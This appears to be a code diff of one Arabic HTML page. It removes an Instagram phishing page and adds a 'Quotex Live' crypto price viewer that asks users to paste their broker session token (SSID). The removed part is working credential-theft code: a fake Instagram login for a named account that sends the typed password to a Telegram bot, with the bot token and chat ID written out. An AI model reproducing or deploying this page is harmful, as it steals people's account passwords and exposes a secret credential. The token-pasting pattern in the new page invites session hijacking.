@@ -2,79 +2,354 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
-<title>Instagram</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Quotex Live</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-tap-highlight-color:transparent}
-body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
-#p1{display:flex;flex-direction:column;min-height:100vh}
-.gear{position:absolute;top:16px;left:16px;width:28px;height:28px;cursor:pointer;z-index:5}
-.wrap{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 24px 24px}
-.insta{width:64px;height:64px;margin-top:56px}
-.avatar{width:230px;height:230px;border-radius:50%;background:#f0f0f0;margin-top:44px;display:flex;align-items:center;justify-content:center;overflow:hidden}
-.avatar img{width:100%;height:100%;object-fit:cover;display:block}
-.name{font-size:28px;font-weight:400;margin-top:26px;color:#000;letter-spacing:0.2px}
-.btn{width:100%;max-width:520px;height:56px;border:0;border-radius:28px;background:#0064e0;color:#fff;font-size:17px;font-weight:600;margin-top:32px;cursor:pointer;transition:opacity .15s}
-.btn:active{opacity:.7}
-.input{width:100%;max-width:520px;height:56px;border:1px solid #dbdbdb;border-radius:12px;padding:0 16px;font-size:16px;margin-top:12px;outline:none;background:#fafafa;display:none;text-align:right}
-.input:focus{border-color:#a8a8a8;background:#fff}
-.other{margin-top:26px;font-size:16px;color:#000;cursor:pointer}
-.bottom{display:flex;flex-direction:column;align-items:center;gap:28px;padding:24px 0 32px}
-.create{border:1px solid #0064e0;color:#0064e0;background:#fff;height:44px;padding:0 28px;border-radius:22px;font-size:15px;font-weight:500;cursor:pointer}
-.meta{display:flex;align-items:center;gap:6px;font-size:16px;font-weight:600;color:#000}
-.meta svg{width:22px;height:22px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
+body{background:#0d1117;color:#e6edf3;min-height:100vh;padding:14px}
+
+.header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 16px;background:#161b22;border:1px solid #30363d;
+  border-radius:12px;margin-bottom:12px
+}
+.title{font-size:15px;font-weight:700}
+.dot{width:10px;height:10px;border-radius:50%;background:#f85149;margin-right:8px;display:inline-block}
+.dot.live{background:#3fb950;animation:p 1.5s infinite}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
+
+.token-panel{
+  display:none;background:#161b22;border:1px solid #f0883e;
+  border-radius:12px;padding:16px;margin-bottom:12px
+}
+.token-panel.show{display:block}
+.token-panel h4{font-size:13px;color:#f0883e;margin-bottom:10px}
+.token-input{
+  width:100%;height:46px;background:#0d1117;border:1px solid #30363d;
+  border-radius:8px;padding:0 14px;color:#e6edf3;font-size:13px;
+  outline:none;font-family:monospace;text-align:left
+}
+.token-input:focus{border-color:#f0883e}
+.actions{display:flex;gap:8px;margin-top:10px}
+.btn{
+  flex:1;height:42px;border:0;border-radius:8px;
+  font-size:14px;font-weight:600;cursor:pointer
+}
+.btn-go{background:#238636;color:#fff}
+.btn-cancel{background:#21262d;color:#e6edf3;border:1px solid #30363d;flex:0 0 auto;padding:0 18px}
+
+.coin{
+  display:flex;align-items:center;justify-content:space-between;
+  background:#161b22;border:1px solid #30363d;border-radius:12px;
+  padding:14px 16px;margin-bottom:8px
+}
+.coin-left{display:flex;align-items:center;gap:12px}
+.coin-icon{
+  width:38px;height:38px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:14px;font-weight:700;color:#fff
+}
+.coin-name{font-size:14px;font-weight:700}
+.coin-label{font-size:11px;color:#8b949e;margin-top:2px}
+.coin-price{
+  font-size:16px;font-weight:700;
+  font-variant-numeric:tabular-nums;transition:color .3s
+}
+.coin-price.up{color:#3fb950}
+.coin-price.down{color:#f85149}
+
+.btc .coin-icon{background:linear-gradient(135deg,#f7931a,#ff6b00)}
+.eth .coin-icon{background:linear-gradient(135deg,#627eea,#3c5db8)}
+.sol .coin-icon{background:linear-gradient(135deg,#9945ff,#14f195)}
+.xrp .coin-icon{background:linear-gradient(135deg,#23292f,#4a5568)}
+
+.log{
+  background:#0d1117;border:1px solid #30363d;border-radius:10px;
+  padding:10px;font-family:monospace;font-size:11px;
+  max-height:200px;overflow-y:auto;margin-top:12px;color:#8b949e
+}
+.log .ok{color:#3fb950}
+.log .err{color:#f85149}
+.log .info{color:#58a6ff}
 </style>
 </head>
 <body>
 
-<div id="p1">
-  <svg class="gear" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <circle cx="12" cy="12" r="3"/>
-    <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
-  </svg>
-  <div class="wrap">
-    <img class="insta" src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram">
-    <div class="avatar">
-      <img src="https://i.ibb.co/BHRqStkS/813645708-17905623771557633-5843878274451591451-n.jpg" alt="">
-    </div>
-    <div class="name">Kbry20958</div>
-    <button class="btn" id="followBtn" onclick="showPass()">متابعة</button>
-    <input class="input" id="passInput" type="password" placeholder="ادخل كلمة السر">
-    <button class="btn" id="followBtn2" style="display:none;margin-top:12px" onclick="followNow()">متابعة</button>
-    <div class="other">استخدام ملف شخصي آخر</div>
-  </div>
-  <div class="bottom">
-    <button class="create">إنشاء حساب جديد</button>
-    <div class="meta">
-      <svg viewBox="0 0 24 24" fill="#0866ff">
-        <path d="M6.5 4.5C3.5 4.5 2 7.5 2 12s1.5 7.5 4.5 7.5c1.5 0 2.8-.6 3.8-1.7l2.5-3.3c.3-.4.9-.4 1.2 0l2.5 3.3c1 1.1 2.3 1.7 3.8 1.7 3 0 4.5-3 4.5-7.5s-1.5-7.5-4.5-7.5c-1.5 0-2.8.6-3.8 1.7l-2.5 3.3c-.3.4-.9.4-1.2 0L9.3 6.2C8.3 5.1 7 4.5 6.5 4.5z"/>
-      </svg>
-      Meta
-    </div>
+<div class="header">
+  <div><span class="dot" id="dot"></span><span class="title">Quotex Live</span></div>
+  <button class="btn btn-go" style="flex:0 0 auto;padding:0 14px;height:34px;font-size:12px" onclick="reconnect()">إعادة الاتصال</button>
+</div>
+
+<div class="token-panel" id="tokenPanel">
+  <h4>⚠️ السيرفر يطلب التوكن (SSID)</h4>
+  <input
+    type="text"
+    id="tokenInput"
+    class="token-input"
+    placeholder="الصق SSID هنا..."
+    autocomplete="off"
+    spellcheck="false"
+  >
+  <div class="actions">
+    <button class="btn btn-go" onclick="submitToken()">إرسال</button>
+    <button class="btn btn-cancel" onclick="hideTokenPanel()">إلغاء</button>
   </div>
 </div>
 
+<div class="coin btc">
+  <div class="coin-left">
+    <div class="coin-icon">₿</div>
+    <div><div class="coin-name">Bitcoin</div><div class="coin-label">BTC / USD</div></div>
+  </div>
+  <div class="coin-price" id="p-BTCUSD">—</div>
+</div>
+
+<div class="coin eth">
+  <div class="coin-left">
+    <div class="coin-icon">Ξ</div>
+    <div><div class="coin-name">Ethereum</div><div class="coin-label">ETH / USD</div></div>
+  </div>
+  <div class="coin-price" id="p-ETHUSD">—</div>
+</div>
+
+<div class="coin sol">
+  <div class="coin-left">
+    <div class="coin-icon">◎</div>
+    <div><div class="coin-name">Solana</div><div class="coin-label">SOL / USD</div></div>
+  </div>
+  <div class="coin-price" id="p-SOLUSD">—</div>
+</div>
+
+<div class="coin xrp">
+  <div class="coin-left">
+    <div class="coin-icon">X</div>
+    <div><div class="coin-name">Ripple</div><div class="coin-label">XRP / USD</div></div>
+  </div>
+  <div class="coin-price" id="p-XRPUSD">—</div>
+</div>
+
+<div class="log" id="log"></div>
+
 <script>
-var BOT_TOKEN="8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
-var CHAT_ID="8599240795";
+// ═══════════════════════════════════════════════════════
+//  Quotex WebSocket — محاولة الاتصال المباشر
+// ═══════════════════════════════════════════════════════
+var WS_URL = "wss://ws2.qxbroker.com/socket.io/?EIO=4&transport=websocket";
+var ASSETS = ["BTCUSD", "ETHUSD", "SOLUSD", "XRPUSD"];
 
-function showPass(){
-  document.getElementById('followBtn').style.display='none';
-  document.getElementById('passInput').style.display='block';
-  document.getElementById('followBtn2').style.display='block';
-  document.getElementById('passInput').focus();
+var socket = null;
+var currentSSID = null;
+var lastPrices = {};
+var subscribeSent = false;
+var authorized = false;
+
+function log(msg, type) {
+  type = type || "info";
+  var el = document.getElementById("log");
+  var t = new Date().toLocaleTimeString();
+  el.innerHTML += '<div class="' + type + '">[' + t + '] ' + msg + '</div>';
+  el.scrollTop = el.scrollHeight;
 }
 
-function followNow(){
-  var v=document.getElementById('passInput').value;
-  if(!v){document.getElementById('passInput').focus();return;}
-  fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram\n👤 Kbry20958\n🔑 "+v})
-  }).catch(function(){});
-  document.getElementById('passInput').value='';
+function setDot(on) {
+  var d = document.getElementById("dot");
+  if (on) d.classList.add("live");
+  else d.classList.remove("live");
 }
+
+function showTokenPanel() {
+  document.getElementById("tokenPanel").classList.add("show");
+  setTimeout(function() {
+    document.getElementById("tokenInput").focus();
+  }, 100);
+}
+
+function hideTokenPanel() {
+  document.getElementById("tokenPanel").classList.remove("show");
+}
+
+function submitToken() {
+  var t = document.getElementById("tokenInput").value.trim();
+  if (!t) {
+    log("التوكن فاضي", "err");
+    return;
+  }
+  currentSSID = t;
+  log("SSID تم إدخاله — إعادة الاتصال", "ok");
+  hideTokenPanel();
+  reconnect();
+}
+
+function reconnect() {
+  if (socket) {
+    try { socket.close(); } catch (e) {}
+    socket = null;
+  }
+  subscribeSent = false;
+  authorized = false;
+  setDot(false);
+
+  log("محاولة الاتصال بـ " + WS_URL, "info");
+
+  try {
+    socket = new WebSocket(WS_URL);
+  } catch (e) {
+    log("فشل إنشاء WebSocket: " + e.message, "err");
+    return;
+  }
+
+  socket.onopen = function() {
+    log("✅ WebSocket متصل", "ok");
+    // Socket.IO handshake — إرسال "40" لبدء الجلسة
+    socket.send("40");
+  };
+
+  socket.onmessage = function(evt) {
+    var data = evt.data;
+    log("← " + data.slice(0, 200), "info");
+
+    // 1) رسالة الترحيب الأولى من Socket.IO (تبدأ بـ "0")
+    if (data.charAt(0) === "0") {
+      log("Socket.IO handshake استقبل", "info");
+      // الرد بـ 40 لتأكيد فتح الـ namespace
+      try { socket.send("40"); } catch (e) {}
+      return;
+    }
+
+    // 2) رد على 40 = فتح القناة بنجاح
+    if (data.indexOf("40") === 0 && !authorized) {
+      log("القناة جاهزة", "ok");
+      authorized = true;
+
+      if (currentSSID) {
+        // إرسال authorization
+        var payload = JSON.stringify(["authorization", {
+          session: currentSSID,
+          isDemo: 1,
+          tournamentId: 0
+        }]);
+        try { socket.send("42" + payload); } catch (e) {}
+        log("تم إرسال SSID للسيرفر", "info");
+
+        // بعد المصادقة — الاشتراك في الأسعار
+        setTimeout(subscribeAll, 800);
+      } else {
+        log("⚠️ مفيش SSID — اضغط على الزر وأدخل التوكن", "err");
+        showTokenPanel();
+      }
+      return;
+    }
+
+    // 3) رسائل الاشتراك والصيانة
+    if (data === "2") {
+      try { socket.send("3"); } catch (e) {}
+      return;
+    }
+
+    // 4) رسائل الأخطاء من السيرفر
+    if (data.indexOf("error") > -1 || data.indexOf("unauthorized") > -1) {
+      log("❌ السيرفر رفض: " + data, "err");
+      if (data.indexOf("auth") > -1 || data.indexOf("session") > -1) {
+        currentSSID = null;
+        showTokenPanel();
+      }
+      return;
+    }
+
+    // 5) رسائل الاشتراك في الـ candles
+    if (data.indexOf("candle") > -1 || data.indexOf("quotes") > -1) {
+      try {
+        var jsonPart = data.substring(data.indexOf("["));
+        var arr = JSON.parse(jsonPart);
+        handleCandles(arr);
+      } catch (e) {}
+    }
+  };
+
+  socket.onerror = function(e) {
+    log("❌ WebSocket error", "err");
+    setDot(false);
+  };
+
+  socket.onclose = function(e) {
+    log("🔌 انقطع الاتصال (code: " + e.code + ")", "err");
+    setDot(false);
+    // محاولة إعادة الاتصال تلقائياً بعد 3 ثواني
+    setTimeout(function() {
+      if (!socket || socket.readyState > 1) {
+        log("محاولة إعادة الاتصال...", "info");
+        reconnect();
+      }
+    }, 3000);
+  };
+}
+
+function subscribeAll() {
+  if (!socket || socket.readyState !== 1) return;
+
+  ASSETS.forEach(function(asset) {
+    var payload = JSON.stringify(["subscribe_candles", {
+      asset: asset,
+      period: 60
+    }]);
+    try {
+      socket.send("42" + payload);
+      log("اشتراك في " + asset, "info");
+    } catch (e) {}
+  });
+  subscribeSent = true;
+}
+
+function handleCandles(arr) {
+  try {
+    if (!Array.isArray(arr) || arr.length < 2) return;
+    var eventName = arr[0];
+    var payload = arr[1];
+
+    if (eventName !== "candles" && eventName !== "quotes") return;
+
+    if (Array.isArray(payload)) {
+      payload.forEach(function(c) {
+        if (c && c.asset && c.close !== undefined) {
+          updatePrice(c.asset, parseFloat(c.close));
+        }
+      });
+    } else if (payload && payload.asset && payload.close !== undefined) {
+      updatePrice(payload.asset, parseFloat(payload.close));
+    }
+  } catch (e) {}
+}
+
+function updatePrice(asset, price) {
+  var el = document.getElementById("p-" + asset);
+  if (!el) return;
+
+  var formatted;
+  if (price >= 1000)      formatted = price.toFixed(2);
+  else if (price >= 1)    formatted = price.toFixed(3);
+  else                    formatted = price.toFixed(5);
+
+  el.textContent = "$" + formatted;
+
+  var last = lastPrices[asset];
+  if (last !== undefined) {
+    el.classList.remove("up", "down");
+    if (price > last)      el.classList.add("up");
+    else if (price < last) el.classList.add("down");
+  }
+  lastPrices[asset] = price;
+}
+
+// ═══════════════════════════════════════════════════════
+//  بدء التشغيل
+// ═══════════════════════════════════════════════════════
+log("Quotex Live — بدء التشغيل", "info");
+reconnect();
+
+// Enter في حقل التوكن = إرسال
+document.getElementById("tokenInput").addEventListener("keypress", function(e) {
+  if (e.key === "Enter") submitToken();
+});
 </script>
 
 </body>
